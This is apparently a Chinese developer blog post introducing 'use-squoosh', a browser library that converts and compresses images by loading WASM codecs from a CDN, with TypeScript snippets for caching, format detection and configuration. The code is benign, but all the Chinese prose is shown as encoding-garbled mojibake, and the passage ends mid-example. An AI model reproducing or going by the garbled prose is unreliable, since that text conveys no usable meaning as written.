#4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"ã€Œ"}.markdown-body strong:after{content:"ã€"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"â";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"â";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="agate">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#333;color:#fff}.hljs-name,.hljs-strong{font-weight:700}.hljs-code,.hljs-emphasis{font-style:italic}.hljs-tag{color:#62c8f3}.hljs-selector-class,.hljs-selector-id,.hljs-template-variable,.hljs-variable{color:#ade5fc}.hljs-bullet,.hljs-string{color:#a2fca2}.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-quote,.hljs-section,.hljs-title,.hljs-type{color:#ffa}.hljs-bullet,.hljs-number,.hljs-symbol{color:#d36363}.hljs-keyword,.hljs-literal,.hljs-selector-tag{color:#fcc28c}.hljs-code,.hljs-comment,.hljs-deletion{color:#888}.hljs-link,.hljs-regexp{color:#c6b4f0}.hljs-meta{color:#fc9b9b}.hljs-deletion{background-color:#fc9b9b;color:#333}.hljs-addition{background-color:#a2fca2;color:#333}.hljs a{color:inherit}.hljs a:focus,.hljs a:hover{color:inherit;text-decoration:underline}</style><p>åœ¨ Web å¼€å‘ä¸­ï¼Œå›¾ç‰‡å¤„ç†æ˜¯ä¸€ä¸ªå¸¸è§éœ€æ±‚ã€‚ä¼ ç»Ÿæ–¹æ¡ˆè¦ä¹ˆä¾èµ–æœåŠ¡ç«¯å¤„ç†ï¼Œè¦ä¹ˆä½¿ç”¨ Canvas APIï¼Œä½†å‰è€…å¢åŠ æœåŠ¡å™¨è´Ÿæ‹…ï¼Œåè€…åœ¨å‹ç¼©è´¨é‡ä¸Šä¸å°½äººæ„ã€‚Google çš„ Squoosh é¡¹ç›®æä¾›äº†åŸºäº WASM çš„é«˜è´¨é‡å›¾ç‰‡ç¼–è§£ç å™¨ï¼Œä½†ç›´æ¥ä½¿ç”¨æ¯”è¾ƒç¹çã€‚</p>
<p>äºæ˜¯æˆ‘å°è£…äº† use-squooshï¼Œä¸€ä¸ªé›¶ä¾èµ–çš„æµè§ˆå™¨ç«¯å›¾ç‰‡è½¬æ¢åº“ï¼Œé€šè¿‡ CDN æŒ‰éœ€åŠ è½½ç¼–è§£ç å™¨ï¼Œå¼€ç®±å³ç”¨ã€‚</p>
<h2 data-id="heading-0">ä¸ºä»€ä¹ˆéœ€è¦è¿™ä¸ªåº“</h2>
<h3 data-id="heading-1">ç°æœ‰æ–¹æ¡ˆçš„å±€é™æ€§</h3>






























<table><thead><tr><th>æ–¹æ¡ˆ</th><th>ä¼˜ç‚¹</th><th>ç¼ºç‚¹</th></tr></thead><tbody><tr><td>æœåŠ¡ç«¯å¤„ç†</td><td>ç¨³å®šå¯é </td><td>å¢åŠ æœåŠ¡å™¨è´Ÿæ‹…ã€ç½‘ç»œå¼€é”€</td></tr><tr><td>Canvas API</td><td>æ— ä¾èµ–</td><td>JPEG è´¨é‡å·®ã€ä¸æ”¯æŒ WebP ç¼–ç </td></tr><tr><td>ç›´æ¥ä½¿ç”¨ @jsquash</td><td>è´¨é‡å¥½</td><td>éœ€è¦æ‰‹åŠ¨ç®¡ç†å¤šä¸ªåŒ…ã€é…ç½® WASM</td></tr><tr><td>åœ¨çº¿å·¥å…·</td><td>ç®€å•</td><td>éšç§é£é™©ã€æ‰¹é‡å¤„ç†ä¸ä¾¿</td></tr></tbody></table>
<h3 data-id="heading-2">Canvas çš„è´¨é‡é—®é¢˜</h3>
<p>Canvas çš„ <code>toBlob()</code> å’Œ <code>toDataURL()</code> æ–¹æ³•è™½ç„¶ç®€å•ï¼Œä½†å­˜åœ¨æ˜æ˜¾ç¼ºé™·ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Canvas æ–¹å¼</span>
canvas.<span class="hljs-title function_">toBlob</span>(callback, <span class="hljs-string">'image/jpeg'</span>, <span class="hljs-number">0.8</span>);
</code></pre>
<p><strong>é—®é¢˜ï¼š</strong></p>
<ol>
<li>JPEG ç¼–ç å™¨è´¨é‡è¾ƒå·®ï¼ŒåŒç­‰æ–‡ä»¶å¤§å°ä¸‹æ¸…æ™°åº¦ä¸å¦‚ä¸“ä¸šç¼–ç å™¨</li>
<li>ä¸æ”¯æŒ WebP ç¼–ç ï¼ˆéƒ¨åˆ†æ—§æµè§ˆå™¨ï¼‰</li>
<li>æ— æ³•ç²¾ç¡®æ§åˆ¶ç¼–ç å‚æ•°</li>
</ol>
<h3 data-id="heading-3">Squoosh çš„ä¼˜åŠ¿</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fsquoosh.app%2F" target="_blank" title="https://squoosh.app/" ref="nofollow noopener noreferrer">Squoosh</a> æ˜¯ Google Chrome Labs å¼€å‘çš„å›¾ç‰‡å‹ç¼©å·¥å…·ï¼Œå…¶æ ¸å¿ƒæ˜¯ä¸€ç³»åˆ—ç¼–è¯‘ä¸º WASM çš„é«˜æ€§èƒ½ç¼–è§£ç å™¨ï¼š</p>
<ul>
<li><strong>MozJPEG</strong>ï¼šMozilla ä¼˜åŒ–çš„ JPEG ç¼–ç å™¨ï¼ŒåŒç­‰è´¨é‡ä¸‹æ–‡ä»¶æ›´å°</li>
<li><strong>libwebp</strong>ï¼šGoogle å®˜æ–¹ WebP ç¼–è§£ç å™¨</li>
<li><strong>OxiPNG</strong>ï¼šRust ç¼–å†™çš„ PNG ä¼˜åŒ–å™¨</li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnickreese%2FjSquash" target="_blank" title="https://github.com/nickreese/jSquash" ref="nofollow noopener noreferrer">@jsquash</a> å°†è¿™äº›ç¼–è§£ç å™¨å°è£…ä¸ºç‹¬ç«‹çš„ npm åŒ…ï¼Œä½†ç›´æ¥ä½¿ç”¨éœ€è¦ï¼š</p>
<ol>
<li>å®‰è£…å¤šä¸ªåŒ…ï¼ˆ@jsquash/webpã€@jsquash/pngã€@jsquash/jpegï¼‰</li>
<li>æ‰‹åŠ¨å¤„ç† WASM æ–‡ä»¶åŠ è½½</li>
<li>ç®¡ç†ç¼–è§£ç å™¨çš„åˆå§‹åŒ–</li>
</ol>
<p>use-squoosh è§£å†³äº†è¿™äº›é—®é¢˜ã€‚</p>
<h2 data-id="heading-4">æ ¸å¿ƒè®¾è®¡æ€è·¯</h2>
<h3 data-id="heading-5">é›¶ä¾èµ– + CDN åŠ è½½</h3>
<p>æœ€æ ¸å¿ƒçš„è®¾è®¡å†³ç­–æ˜¯ï¼š<strong>ä¸æ‰“åŒ…ç¼–è§£ç å™¨ï¼Œè¿è¡Œæ—¶ä» CDN åŠ è½½</strong>ã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ç¼–è§£ç å™¨é€šè¿‡åŠ¨æ€ import ä» CDN åŠ è½½</span>
<span class="hljs-keyword">const</span> url = <span class="hljs-string">`<span class="hljs-subst">${cdnConfig.baseUrl}</span>/@jsquash/webp@<span class="hljs-subst">${version}</span>/encode.js`</span>;
<span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-comment">/* @vite-ignore */</span> url);
</code></pre>
<p><strong>å¥½å¤„ï¼š</strong></p>
<ol>
<li>åº“æœ¬èº«ä½“ç§¯æå°ï¼ˆ&lt; 5KB gzippedï¼‰</li>
<li>ç¼–è§£ç å™¨æŒ‰éœ€åŠ è½½ï¼Œä¸ä½¿ç”¨çš„æ ¼å¼ä¸ä¼šä¸‹è½½</li>
<li>åˆ©ç”¨ CDN ç¼“å­˜ï¼Œå¤šé¡¹ç›®å…±äº«åŒä¸€ä»½ WASM</li>
</ol>
<p><strong>åŠ è½½æ—¶æœºï¼š</strong></p>
<ul>
<li>é¦–æ¬¡è°ƒç”¨è½¬æ¢å‡½æ•°æ—¶åŠ è½½å¯¹åº”æ ¼å¼çš„ç¼–è§£ç å™¨</li>
<li>åŠ è½½åç¼“å­˜åˆ° <code>window</code> å¯¹è±¡ï¼Œé¡µé¢å†…å¤ç”¨</li>
<li>æ”¯æŒé¢„åŠ è½½å…³é”®æ ¼å¼</li>
</ul>
<h3 data-id="heading-6">Promise ç¼“å­˜é¿å…ç«æ€</h3>
<p>å¹¶å‘åœºæ™¯ä¸‹å¯èƒ½åŒæ—¶è§¦å‘å¤šæ¬¡åŠ è½½ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// é”™è¯¯ç¤ºä¾‹ï¼šå¯èƒ½é‡å¤åŠ è½½</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getEncoder</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">if</span> (!cache.<span class="hljs-property">encoder</span>) {
    cache.<span class="hljs-property">encoder</span> = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(url);  <span class="hljs-comment">// å¹¶å‘æ—¶ä¼šå¤šæ¬¡è§¦å‘</span>
  }
  <span class="hljs-keyword">return</span> cache.<span class="hljs-property">encoder</span>;
}
</code></pre>
<p>è§£å†³æ–¹æ¡ˆæ˜¯ç¼“å­˜ Promise è€Œéç»“æœï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ­£ç¡®ç¤ºä¾‹ï¼šç¼“å­˜ Promise</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getCodec</span>(<span class="hljs-params"><span class="hljs-keyword">type</span>: CodecType</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">any</span>&gt; {
  <span class="hljs-keyword">const</span> cache = <span class="hljs-title function_">getCache</span>();
  <span class="hljs-keyword">if</span> (!cache[<span class="hljs-keyword">type</span>]) {
    <span class="hljs-comment">// ç¼“å­˜ Promise æœ¬èº«ï¼Œè€Œé await åçš„ç»“æœ</span>
    cache[<span class="hljs-keyword">type</span>] = <span class="hljs-keyword">import</span>(<span class="hljs-comment">/* @vite-ignore */</span> url);
  }
  <span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> = <span class="hljs-keyword">await</span> cache[<span class="hljs-keyword">type</span>];
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">module</span>.<span class="hljs-property">default</span>;
}
</code></pre>
<p>è¿™æ ·å³ä½¿å¹¶å‘è°ƒç”¨ï¼Œä¹Ÿåªä¼šè§¦å‘ä¸€æ¬¡ç½‘ç»œè¯·æ±‚ã€‚</p>
<h3 data-id="heading-7">å…¨å±€ç¼“å­˜æ”¯æŒå¤šé¡¹ç›®å…±äº«</h3>
<p>ç¼–è§£ç å™¨æŒ‚è½½åˆ° <code>window</code> å¯¹è±¡ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getCache</span>(<span class="hljs-params"/>): <span class="hljs-title class_">CodecCache</span> {
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">window</span> !== <span class="hljs-string">"undefined"</span>) {
    <span class="hljs-keyword">const</span> key = cdnConfig.<span class="hljs-property">cacheKey</span>;
    <span class="hljs-keyword">if</span> (!(<span class="hljs-variable language_">window</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>)[key]) {
      (<span class="hljs-variable language_">window</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>)[key] = <span class="hljs-title function_">createEmptyCache</span>();
    }
    <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">window</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>)[key];
  }
  <span class="hljs-keyword">return</span> moduleCache;  <span class="hljs-comment">// éæµè§ˆå™¨ç¯å¢ƒå›é€€</span>
}
</code></pre>
<p><strong>å¥½å¤„ï¼š</strong></p>
<ul>
<li>åŒä¸€é¡µé¢å¤šä¸ªç»„ä»¶/åº“ä½¿ç”¨ use-squooshï¼Œå…±äº«ç¼–è§£ç å™¨</li>
<li>é¡µé¢å¯¼èˆªä¸é‡æ–°åŠ è½½ï¼ˆSPA åœºæ™¯ï¼‰</li>
<li>å¯é…ç½® <code>cacheKey</code> å®ç°éš”ç¦»</li>
</ul>
<h2 data-id="heading-8">å®ç°ç»†èŠ‚</h2>
<h3 data-id="heading-9">æ ¼å¼è‡ªåŠ¨æ£€æµ‹</h3>
<p>å½“è¾“å…¥æ˜¯ <code>Blob</code> æˆ– <code>File</code> æ—¶ï¼Œè‡ªåŠ¨ä» MIME ç±»å‹æ£€æµ‹æ ¼å¼ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> <span class="hljs-attr">FORMAT_MAP</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">ImageFormat</span>&gt; = {
  <span class="hljs-string">"image/png"</span>: <span class="hljs-string">"png"</span>,
  <span class="hljs-string">"image/jpeg"</span>: <span class="hljs-string">"jpeg"</span>,
  <span class="hljs-string">"image/webp"</span>: <span class="hljs-string">"webp"</span>,
  <span class="hljs-comment">// åŒæ—¶æ”¯æŒæ‰©å±•å</span>
  <span class="hljs-attr">png</span>: <span class="hljs-string">"png"</span>,
  <span class="hljs-attr">jpeg</span>: <span class="hljs-string">"jpeg"</span>,
  <span class="hljs-attr">jpg</span>: <span class="hljs-string">"jpeg"</span>,
  <span class="hljs-attr">webp</span>: <span class="hljs-string">"webp"</span>,
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">convert</span>(<span class="hljs-params">
  input: <span class="hljs-built_in">ArrayBuffer</span> | Blob | File,
  options: ConvertOptions = {},
</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">ArrayBuffer</span>&gt; {
  <span class="hljs-keyword">let</span> <span class="hljs-attr">buffer</span>: <span class="hljs-title class_">ArrayBuffer</span>;
  <span class="hljs-keyword">let</span> fromFormat = options.<span class="hljs-property">from</span>;

  <span class="hljs-keyword">if</span> (input <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Blob</span> || input <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">File</span>) {
    buffer = <span class="hljs-keyword">await</span> input.<span class="hljs-title function_">arrayBuffer</span>();
    <span class="hljs-comment">// è‡ªåŠ¨æ£€æµ‹æ ¼å¼</span>
    <span class="hljs-keyword">if</span> (!fromFormat &amp;&amp; input.<span class="hljs-property">type</span>) {
      fromFormat = <span class="hljs-title function_">getFormat</span>(input.<span class="hljs-property">type</span>) ?? <span class="hljs-literal">undefined</span>;
    }
  } <span class="hljs-keyword">else</span> {
    buffer = input;
  }

  <span class="hljs-comment">// ...</span>
}
</code></pre>
<h3 data-id="heading-10">è§£ç  -&gt; ç¼–ç æµç¨‹</h3>
<p>å›¾ç‰‡è½¬æ¢æœ¬è´¨æ˜¯ï¼šè§£ç ä¸º ImageData â†’ ç¼–ç ä¸ºç›®æ ‡æ ¼å¼ã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">
  buffer: <span class="hljs-built_in">ArrayBuffer</span>,
  <span class="hljs-keyword">type</span>: ImageFormat,
</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">ImageData</span>&gt; {
  <span class="hljs-keyword">switch</span> (<span class="hljs-keyword">type</span>.<span class="hljs-title function_">toLowerCase</span>()) {
    <span class="hljs-keyword">case</span> <span class="hljs-string">"png"</span>: {
      <span class="hljs-keyword">const</span> decoder = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getPngDecoder</span>();
      <span class="hljs-keyword">return</span> <span class="hljs-title function_">decoder</span>(buffer);
    }
    <span class="hljs-keyword">case</span> <span class="hljs-string">"jpeg"</span>:
    <span class="hljs-keyword">case</span> <span class="hljs-string">"jpg"</span>: {
      <span class="hljs-keyword">const</span> decoder = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getJpegDecoder</span>();
      <span class="hljs-keyword">return</span> <span class="hljs-title function_">decoder</span>(buffer);
    }
    <span class="hljs-keyword">case</span> <span class="hljs-string">"webp"</span>: {
      <span class="hljs-keyword">const</span> decoder = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getWebpDecoder</span>();
      <span class="hljs-keyword">return</span> <span class="hljs-title function_">decoder</span>(buffer);
    }
    <span class="hljs-attr">default</span>:
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`Unsupported decode type: <span class="hljs-subst">${<span class="hljs-keyword">type</span>}</span>`</span>);
  }
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">
  imageData: ImageData,
  <span class="hljs-keyword">type</span>: ImageFormat,
  options: { quality?: <span class="hljs-built_in">number</span> } = {},
</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">ArrayBuffer</span>&gt; {
  <span class="hljs-keyword">switch</span> (<span class="hljs-keyword">type</span>.<span class="hljs-title function_">toLowerCase</span>()) {
    <span class="hljs-keyword">case</span> <span class="hljs-string">"png"</span>: {
      <span class="hljs-keyword">const</span> encoder = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getPngEncoder</span>();
      <span class="hljs-keyword">return</span> <span class="hljs-title function_">encoder</span>(imageData);  <span class="hljs-comment">// PNG æ— æŸï¼Œä¸éœ€è¦ quality</span>
    }
    <span class="hljs-keyword">case</span> <span class="hljs-string">"jpeg"</span>:
    <span class="hljs-keyword">case</span> <span class="hljs-string">"jpg"</span>: {
      <span class="hljs-keyword">const</span> encoder = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getJpegEncoder</span>();
      <span class="hljs-keyword">return</span> <span class="hljs-title function_">encoder</span>(imageData, { <span class="hljs-attr">quality</span>: options.<span class="hljs-property">quality</span> ?? <span class="hljs-number">75</span> });
    }
    <span class="hljs-keyword">case</span> <span class="hljs-string">"webp"</span>: {
      <span class="hljs-keyword">const</span> encoder = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getWebpEncoder</span>();
      <span class="hljs-keyword">return</span> <span class="hljs-title function_">encoder</span>(imageData, { <span class="hljs-attr">quality</span>: options.<span class="hljs-property">quality</span> ?? <span class="hljs-number">75</span> });
    }
    <span class="hljs-attr">default</span>:
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`Unsupported encode type: <span class="hljs-subst">${<span class="hljs-keyword">type</span>}</span>`</span>);
  }
}
</code></pre>
<h3 data-id="heading-11">CDN é…ç½®ç³»ç»Ÿ</h3>
<p>æ”¯æŒè‡ªå®šä¹‰ CDN åœ°å€å’Œç‰ˆæœ¬ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">CDNConfig</span> {
  baseUrl?: <span class="hljs-built_in">string</span>;      <span class="hljs-comment">// CDN åŸºç¡€è·¯å¾„</span>
  webpVersion?: <span class="hljs-built_in">string</span>;  <span class="hljs-comment">// @jsquash/webp ç‰ˆæœ¬</span>
  pngVersion?: <span class="hljs-built_in">string</span>;   <span class="hljs-comment">// @jsquash/png ç‰ˆæœ¬</span>
  jpegVersion?: <span class="hljs-built_in">string</span>;  <span class="hljs-comment">// @jsquash/jpeg ç‰ˆæœ¬</span>
  cacheKey?: <span class="hljs-built_in">string</span>;     <span class="hljs-comment">// window ç¼“å­˜ key</span>
}

<span class="hljs-keyword">const</span> <span class="hljs-attr">defaultCDNConfig</span>: <span class="hljs-title class_">Required</span>&lt;<span class="hljs-title class_">CDNConfig</span>&gt; = {
  <span class="hljs-attr">baseUrl</span>: <span class="hljs-string">"https://cdn.jsdelivr.net/npm"</span>,
  <span class="hljs-attr">webpVersion</span>: <span class="hljs-string">"1.5.0"</span>,
  <span class="hljs-attr">pngVersion</span>: <span class="hljs-string">"3.1.1"</span>,
  <span class="hljs-attr">jpegVersion</span>: <span class="hljs-string">"1.6.0"</span>,
  <span class="hljs-attr">cacheKey</span>: <span class="hljs-string">"__ImageConverterCache__"</span>,
};
</code></pre>
<p><strong>æ™ºèƒ½ç¼“å­˜æ¸…é™¤ï¼š</strong> åªæœ‰ CDN ç›¸å…³é…ç½®å˜æ›´æ—¶æ‰æ¸…é™¤ç¼“å­˜ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">configure</span>(<span class="hljs-params">config: CDNConfig</span>): <span class="hljs-built_in">void</span> {
  <span class="hljs-keyword">const</span> <span class="hljs-attr">cdnKeys</span>: (keyof <span class="hljs-title class_">CDNConfig</span>)[] = [
    <span class="hljs-string">"baseUrl"</span>, <span class="hljs-string">"webpVersion"</span>, <span class="hljs-string">"pngVersion"</span>, <span class="hljs-string">"jpegVersion"</span>,
  ];

  <span class="hljs-comment">// åªæœ‰è¿™äº›å­—æ®µå˜æ›´æ‰æ¸…é™¤ç¼“å­˜</span>
  <span class="hljs-keyword">const</span> needsClearCache = cdnKeys.<span class="hljs-title function_">some</span>(
    <span class="hljs-function">(<span class="hljs-params">key</span>) =&gt;</span> key <span class="hljs-keyword">in</span> config &amp;&amp; config[key] !== cdnConfig[key],
  );

  cdnConfig = { ...cdnConfig, ...config };

  <span class="hljs-keyword">if</span> (needsClearCache) {
    <span class="hljs-title function_">clearCache</span>();
  }
}
</code></pre>
<h3 data-id="heading-12">ç¼–è§£ç å™¨ URL ç”Ÿæˆ</h3>
<p>ç»Ÿä¸€ç®¡ç†ç¼–è§£ç å™¨çš„åŒ…åã€ç‰ˆæœ¬å’Œæ–‡ä»¶è·¯å¾„ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> <span class="hljs-attr">codecConfig</span>: <span class="hljs-title class_">Record</span>&lt;
  <span class="hljs-title class_">CodecType</span>,
  { <span class="hljs-attr">pkg</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">version</span>: keyof <span class="hljs-title class_">CDNConfig</span>; <span class="hljs-attr">file</span>: <span class="hljs-built_in">string</span> }
&gt; = {
  <span class="hljs-attr">webpEncoder</span>: { <span class="hljs-attr">pkg</span>: <span class="hljs-string">"@jsquash/webp"</span>, <span class="hljs-attr">version</span>: <span class="hljs-string">"webpVersion"</span>, <span class="hljs-attr">file</span>: <span class="hljs-string">"encode.js"</span> },
  <span class="hljs-attr">webpDecoder</span>: { <span class="hljs-attr">pkg</span>: <span class="hljs-string">"@jsquash/webp"</span>, <span class="hljs-attr">version</span>: <span class="hljs-string">"webpVersion"</span>, <span class="hljs-attr">file</span>: <span class="hljs-string">"decode.js"</span> },
  <span class="hljs-attr">pngEncoder</span>: { <span class="hljs-attr">pkg</span>: <span class="hljs-string">"@jsquash/png"</span>, <span class="hljs-attr">version</span>: <span class="hljs-string">"pngVersion"</span>, <span class="hljs-attr">file</span>: <span class="hljs-string">"encode.js"</span> },
  <span class="hljs-attr">pngDecoder</span>: { <span class="hljs-attr">pkg</span>: <span class="hljs-string">"@jsquash/png"</span>, <span class="hljs-attr">version</span>: <span class="hljs-string">"pngVersion"</span>, <span class="hljs-attr">file</span>: <span class="hljs-string">"decode.js"</span> },
  <span class="hljs-attr">jpegEncoder</span>: { <span class="hljs-attr">pkg</span>: <span class="hljs-string">"@jsquash/jpeg"</span>, <span class="hljs-attr">version</span>: <span class="hljs-string">"jpegVersion"</span>, <span class="hljs-attr">file</span>: <span class="hljs-string">"encode.js"</span> },
  <span class="hljs-attr">jpegDecoder</span>: { <span class="hljs-attr">pkg</span>: <span class="hljs-string">"@jsquash/jpeg"</span>, <span class="hljs-attr">version</span>: <span class="hljs-string">"jpegVersion"</span>, <span class="hljs-attr">file</span>: <span class="hljs-string">"decode.js"</span> },
};

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getCodec</span>(<span class="hljs-params"><span class="hljs-keyword">type</span>: CodecType</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">any</span>&gt; {
  <span class="hljs-keyword">const</span> cache = <span class="hljs-title function_">getCache</span>();
  <span class="hljs-keyword">if</span> (!cache[<span class="hljs-keyword">type</span>]) {
    <span class="hljs-keyword">const</span> { pkg, version, file } = codecConfig[<span class="hljs-keyword">type</span>];
    <span class="hljs-keyword">const</span> url = <span class="hljs-string">`<span class="hljs-subst">${cdnConfig.baseUrl}</span>/<span class="hljs-subst">${pkg}</span>@<span class="hljs-subst">${cdnConfig[version]}</span>/<span class="hljs-subst">${file}</span>`</span>;
    cache[<span class="hljs-keyword">type</span>] = <span class="hljs-keyword">import</span>(<span class="hljs-comment">/* @vite-ignore */</span> url);
  }
  <span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> = <span class="hljs-keyword">await</span> cache[<span class="hljs-keyword">type</span>];
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">module</span>.<span class="hljs-property">default</span>;
}
</code></pre>
<h2 data-id="heading-13">ä½¿ç”¨æ–¹å¼</h2>
<h3 data-id="heading-14">åŸºæœ¬ä½¿ç”¨</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { convert, pngToWebp, compress } <span class="hljs-keyword">from</span> <span class="hljs-string">'use-squoosh'</span>;

<span class="hljs-comment">// æ–‡ä»¶é€‰æ‹©å™¨è·å–å›¾ç‰‡</span>
<span class="hljs-keyword">const</span> file = input.<span class="hljs-property">files</span>[<span class="hljs-number">0</span>];

<span class="hljs-comment">// PNG è½¬ WebP</span>
<span class="hljs-keyword">const</span> webpBuffer = <span class="hljs-keyword">await</span> <span class="hljs-title function_">pngToWebp</span>(file, { <span class="hljs-attr">quality</span>: <span class="hljs-number">80</span> });

<span class="hljs-comment">// é€šç”¨è½¬æ¢</span>
<span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">convert</span>(file, {
  <span class="hljs-attr">from</span>: <span class="hljs-string">'png'</span>,    <span class="hljs-comment">// Blob/File å¯çœç•¥ï¼Œè‡ªåŠ¨æ£€æµ‹</span>
  <span class="hljs-attr">to</span>: <span class="hljs-string">'webp'</span>,
  <span class="hljs-attr">quality</span>: <span class="hljs-number">85</span>
});

<span class="hljs-comment">// å‹ç¼©ï¼ˆä¿æŒåŸæ ¼å¼ï¼‰</span>
<span class="hljs-keyword">const</span> compressed = <span class="hljs-keyword">await</span> <span class="hljs-title function_">compress</span>(file, {
  <span class="hljs-attr">format</span>: <span class="hljs-string">'jpeg'</span>,
  <span class="hljs-attr">quality</span>: <span class="hljs-number">70</span>
});
</code></pre>
<h3 data-id="heading-15">é…ç½® CDN</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { configure } <span class="hljs-keyword">from</span> <span class="hljs-string">'use-squoosh'</span>;

<span class="hljs-comment">// ä½¿ç”¨ unpkg</span>
<span class="hljs-title function_">configure</span>({ <span class="hljs-attr">baseUrl</span>: <span class="hljs-string">'https://unpkg.com'</span> });

<span class="hljs-comment">// ä½¿ç”¨è‡ªæ‰˜ç®¡ CDN</span>
<span class="hljs-title function_">configure</span>({ <span class="hljs-attr">baseUrl</span>: <span class="hljs-string">'https://your-cdn.com/npm'</span> });

<span class="hljs-comment">// é”å®šç‰¹å®šç‰ˆæœ¬</span>
<span class="hljs-title function_">configure</span>({
  <span class="hljs-attr">webpVersion</span>: <span class="hljs-string">'1.5.0'</span>,
  <span class="hljs-attr">pngVersion</span>: <span class="hljs-string">'3.1.1'</span>,
  <span class="hljs-attr">jpegVersion</span>: <span class="hljs-string">'1.6.0'</span>
});
</code></pre>
<h3 data-id="heading-16">é¢„åŠ è½½ä¼˜åŒ–é¦–å±</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { preload, isLoaded } <span class="hljs-keyword">from</span> <span class="hljs-string">'use-squoosh'</span>;

